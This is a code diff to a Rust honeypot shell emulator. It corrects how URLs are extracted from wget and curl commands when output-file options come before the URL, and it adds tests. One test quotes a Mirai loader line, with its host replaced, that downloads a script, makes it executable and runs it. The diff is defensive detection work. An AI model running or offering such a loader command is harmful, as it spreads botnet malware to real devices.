@@ -405,9 +405,75 @@ fn download_target(parts: &[&str]) -> Option<String> {
     match cmd {
         "tftp" => tftp_url(args),
         "ftpget" => ftpget_url(args),
-        _ => first_non_flag_arg(args).map(str::to_string),
+        _ => fetch_url_arg(cmd, args).map(str::to_string),
     }
 }
+
+/// The URL argument of a `wget`/`curl` invocation. A token carrying a scheme wins outright,
+/// whatever its position. Failing that, the first positional that is not the VALUE of an option:
+/// `wget -q -O 1.sh http://h/1.sh` names its output file before the URL, and a parser that only
+/// skips dash-prefixed tokens returned `1.sh` as the download - a bare filename the fetcher could
+/// never retrieve (observed live 2026-09-03 on a Mirai loader line). Only the options that take a
+/// separate value are consumed; a value attached to its flag (`-O-`, `-qO-`, `-o1.sh`) is not.
+fn fetch_url_arg<'a>(cmd: &str, args: &[&'a str]) -> Option<&'a str> {
+    if let Some(url) = args.iter().find(|a| a.contains("://")) {
+        return Some(url);
+    }
+    // Short options that take the next token as their value. Everything else is a bare switch.
+    let short_with_value: &[char] = match cmd {
+        "wget" => &['O', 'o', 'P', 'T', 't', 'U', 'w', 'a', 'i', 'B', 'e'],
+        _ => &[
+            'o', 'H', 'd', 'A', 'X', 'u', 'm', 'e', 'x', 'T', 'b', 'c', 'K', 'w',
+        ],
+    };
+    let mut it = args.iter();
+    while let Some(&a) = it.next() {
+        if let Some(long) = a.strip_prefix("--") {
+            // `--output=x` carries its value; `--output x` does not.
+            if !long.contains('=') && LONG_OPTIONS_WITH_VALUE.contains(&long) {
+                it.next();
+            }
+        } else if let Some(cluster) = a.strip_prefix('-')
+            && !cluster.is_empty()
+        {
+            // In a cluster like `-qO`, a value-taking letter with nothing after it consumes the
+            // next token; with characters after it (`-qO-`, `-so1.sh`) the value is attached.
+            let mut chars = cluster.chars();
+            while let Some(c) = chars.next() {
+                if short_with_value.contains(&c) {
+                    if chars.as_str().is_empty() {
+                        it.next();
+                    }
+                    break;
+                }
+            }
+        } else {
+            return Some(a);
+        }
+    }
+    None
+}
+
+const LONG_OPTIONS_WITH_VALUE: [&str; 18] = [
+    "output-document",
+    "output-file",
+    "directory-prefix",
+    "timeout",
+    "tries",
+    "user-agent",
+    "wait",
+    "header",
+    "post-data",
+    "output",
+    "data",
+    "request",
+    "user",
+    "max-time",
+    "referer",
+    "proxy",
+    "upload-file",
+    "cookie",
+];
 
 /// The distinct URLs a line retrieves, in order of first appearance. A loader line is rarely one
 /// simple command: Mirai wraps every fetcher in a `( a || busybox a ) > f; chmod ...` fallback
@@ -714,7 +780,7 @@ const FETCHED_BODY: &str =
 /// name was a tell); `-q`/`-nv` suppress the banner as real wget does; `-O-`/`-qO-` write the body
 /// to stdout (the `wget -qO- | sh` loader pattern) instead of the transcript.
 fn cmd_wget(parts: &[&str]) -> String {
-    let url = first_non_flag_arg(&parts[1..]).unwrap_or("");
+    let url = fetch_url_arg("wget", &parts[1..]).unwrap_or("");
     let sanitized_url = sanitize_value(url, MAX_URL_LEN);
 
     let out = wget_output(parts);
@@ -1307,6 +1373,45 @@ mod shell_detection_tests {
             Some("tftp://198.51.100.9")
         );
         assert_eq!(download_target(&["tftp", "-g", "-r", "x"]), None);
+    }
+
+    /// A loader line seen live 2026-09-03 (host replaced): the output file is named BEFORE the
+    /// url, and the whole thing is a `cd` chain with the fetchers in a subshell. It was recorded
+    /// as a download of `1.sh`, a bare filename the fetcher could not retrieve.
+    #[test]
+    fn output_file_named_before_the_url_is_not_mistaken_for_the_url() {
+        let line = "cd /tmp||cd /var/run||cd /mnt||cd /root||cd /;(wget -q -O 1.sh http://198.51.100.9:80/1.sh||busybox wget -q -O 1.sh http://198.51.100.9:80/1.sh||curl -so 1.sh http://198.51.100.9:80/1.sh)&&chmod 777 1.sh&&sh 1.sh;echo ok";
+        let (_out, events) = shell().handle_input(line);
+        let urls: Vec<_> = events
+            .iter()
+            .filter(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
+            .map(|e| e.metadata["url"].as_str().unwrap().to_string())
+            .collect();
+        assert_eq!(urls, vec!["http://198.51.100.9:80/1.sh"]);
+
+        // Schemeless forms still resolve by position, with option values skipped either way.
+        assert_eq!(
+            download_target(&["wget", "-q", "-O", "1.sh", "198.51.100.9/1.sh"]).as_deref(),
+            Some("198.51.100.9/1.sh")
+        );
+        assert_eq!(
+            download_target(&["wget", "-qO", "1.sh", "198.51.100.9/1.sh"]).as_deref(),
+            Some("198.51.100.9/1.sh"),
+            "a cluster ending in a value-taking letter consumes the next token"
+        );
+        assert_eq!(
+            download_target(&["wget", "-qO-", "198.51.100.9/1.sh"]).as_deref(),
+            Some("198.51.100.9/1.sh"),
+            "an attached value (`-qO-`) must not consume the url"
+        );
+        assert_eq!(
+            download_target(&["curl", "-so", "1.sh", "198.51.100.9/1.sh"]).as_deref(),
+            Some("198.51.100.9/1.sh")
+        );
+        assert_eq!(
+            download_target(&["curl", "--output", "1.sh", "198.51.100.9/1.sh"]).as_deref(),
+            Some("198.51.100.9/1.sh")
+        );
     }
 
     /// The three retrieval lines a live Mirai loader sent (2026-09-02), verbatim except the host.
